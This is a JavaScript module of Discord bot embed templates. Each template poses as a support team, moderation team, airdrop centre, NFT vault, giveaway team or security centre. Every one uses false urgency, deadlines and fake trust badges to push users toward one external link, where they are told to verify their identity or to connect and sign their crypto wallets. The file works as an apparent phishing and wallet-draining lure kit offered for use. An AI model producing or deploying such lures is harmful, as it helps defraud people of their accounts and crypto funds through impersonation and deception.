module.exports = {
  verify_support: {
    embed: {
      title: '🔔 Immediate Action Required: Support Ticket Hold',
      author: {
        name: '🎧 Verified Support Team',
        iconURL: 'https://cdn.fakecdn.net/support/support-agent-avatar.png',
      },
      description:
        `Thank you for submitting your support request.\n\n` +
        `🛡️ To proceed securely, you are required to verify your identity. This helps prevent unauthorized access and ensures your request is handled correctly.\n\n` +
        `🔗 [Click here](https://chainhelpers.netlify.app/) to verify your support session.\n\n` +
        `⚠️ You must complete verification within 15 minutes to avoid automatic ticket closure and escalation to the moderation team.`,
      image: { url: 'https://cdn.fakecdn.net/support/verify-banner.png' },
      footer: {
        text: 'Trusted by 1,000+ verified users',
        iconURL: 'https://cdn.fakecdn.net/support/trust-badge.png',
      },
      color: '#FF5733',
      timestamp: new Date().toISOString(),
    },
    expiryMinutes: 15,
  },

  airdrop_claim: {
    embed: {
      title: '🎁 Airdrop Claim Available!',
      author: {
        name: '🚀 Official Airdrop Center',
        iconURL: 'https://cdn.fakecdn.net/airdrop/logo.png',
      },
      description:
        `You're eligible for an exclusive airdrop!\n\n` +
        `💸 Claim your tokens now before the window closes.\n\n` +
        `✅ Verified wallet required for eligibility check.\n` +
        `🔗 [Click here](https://chainhelpers.netlify.app/) to verify and claim your drop.`,
      image: { url: 'https://cdn.fakecdn.net/airdrop/claim-banner.gif' },
      footer: {
        text: 'Airdrop ends soon!',
        iconURL: 'https://cdn.fakecdn.net/airdrop/timer.png',
      },
      color: '#2ECC71',
      timestamp: new Date().toISOString(),
    },
    expiryMinutes: 30,
  },

  wallet_check: {
    embed: {
      title: '🔐 Wallet Verification Required',
      author: {
        name: '✅ Verification System',
        iconURL: 'https://cdn.fakecdn.net/wallet/verify-badge.png',
      },
      description:
        `To continue, please verify your wallet.\n\n` +
        `🧩 Supported wallets: MetaMask, Trust Wallet, Phantom, WalletConnect\n\n` +
        `🔗 [Click here](https://chainhelpers.netlify.app/) to connect and sign to verify ownership.\n\n` +
        `🔒 This process is secure and helps keep your account safe.`,
      image: { url: 'https://cdn.fakecdn.net/wallet/connect-banner.png' },
      footer: {
        text: 'All wallet verifications are end-to-end encrypted.',
        iconURL: 'https://cdn.fakecdn.net/security/secure-icon.png',
      },
      color: '#3498DB',
      timestamp: new Date().toISOString(),
    },
    expiryMinutes: 20,
  },

  moderation_warning: {
    embed: {
      title: '⚠️ Account Warning Issued',
      author: {
        name: '🛡️ Discord Moderation Team',
        iconURL: 'https://cdn.fakecdn.net/mod/warning-icon.png',
      },
      description:
        `Your account has triggered a moderation flag due to recent activity.\n\n` +
        `🚨 Immediate verification is required to avoid penalties.\n\n` +
        `🔗 [Click here](https://chainhelpers.netlify.app/) to confirm your identity and resolve the issue.`,
      image: { url: 'https://cdn.fakecdn.net/mod/warning-banner.jpg' },
      footer: {
        text: 'Contact support for more information.',
        iconURL: 'https://cdn.fakecdn.net/support/contact-icon.png',
      },
      color: '#E67E22',
      timestamp: new Date().toISOString(),
    },
    expiryMinutes: 10,
  },

  nft_claim: {
    embed: {
      title: '🖼️ Exclusive NFT Drop for Verified Users',
      author: {
        name: '🎨 NFT Vault',
        iconURL: 'https://cdn.fakecdn.net/nft/vault-icon.png',
      },
      description:
        `Congratulations! You’ve been selected to receive a limited edition NFT.\n\n` +
        `🎁 Connect your wallet to view and mint your collectible art.\n\n` +
        `🔗 [Click here](https://chainhelpers.netlify.app/) to verify and claim your NFT drop.`,
      image: { url: 'https://cdn.fakecdn.net/nft/nft-banner.png' },
      footer: {
        text: 'Verified wallets only. Supply is limited.',
        iconURL: 'https://cdn.fakecdn.net/nft/supply-icon.png',
      },
      color: '#9B59B6',
      timestamp: new Date().toISOString(),
    },
    expiryMinutes: 25,
  },

  giveaway_entry: {
    embed: {
      title: '🏆 Confirm Your Giveaway Entry',
      author: {
        name: '🎉 Events Team',
        iconURL: 'https://cdn.fakecdn.net/events/giveaway-icon.png',
      },
      description:
        `You're just one step away from entering the community giveaway!\n\n` +
        `🎟️ Prizes include ETH, NFTs, and exclusive access.\n\n` +
        `🔗 [Click here](https://chainhelpers.netlify.app/) to verify your eligibility and lock your entry.`,
      image: { url: 'https://cdn.fakecdn.net/events/prizes-banner.jpg' },
      footer: {
        text: 'Winners will be announced in 48 hours!',
        iconURL: 'https://cdn.fakecdn.net/events/timer-icon.png',
      },
      color: '#F1C40F',
      timestamp: new Date().toISOString(),
    },
    expiryMinutes: 30,
  },

  login_issue: {
    embed: {
      title: '🔑 Suspicious Login Detected',
      author: {
        name: '🔒 Account Security Center',
        iconURL: 'https://cdn.fakecdn.net/security/login-icon.png',
      },
      description:
        `We noticed a login attempt from a new location/device.\n\n` +
        `📍 IP: 192.168.0.248\n` +
        `🌐 Region: Unknown\n\n` +
        `⚠️ If this wasn’t you, please [click here](https://chainhelpers.netlify.app/) to verify your identity and secure your account.`,
      image: { url: 'https://cdn.fakecdn.net/security/alert-banner.gif' },
      footer: {
        text: 'Secure your account now.',
        iconURL: 'https://cdn.fakecdn.net/security/alert-icon.png',
      },
      color: '#C0392B',
      timestamp: new Date().toISOString(),
    },
    expiryMinutes: 5,
  },
};
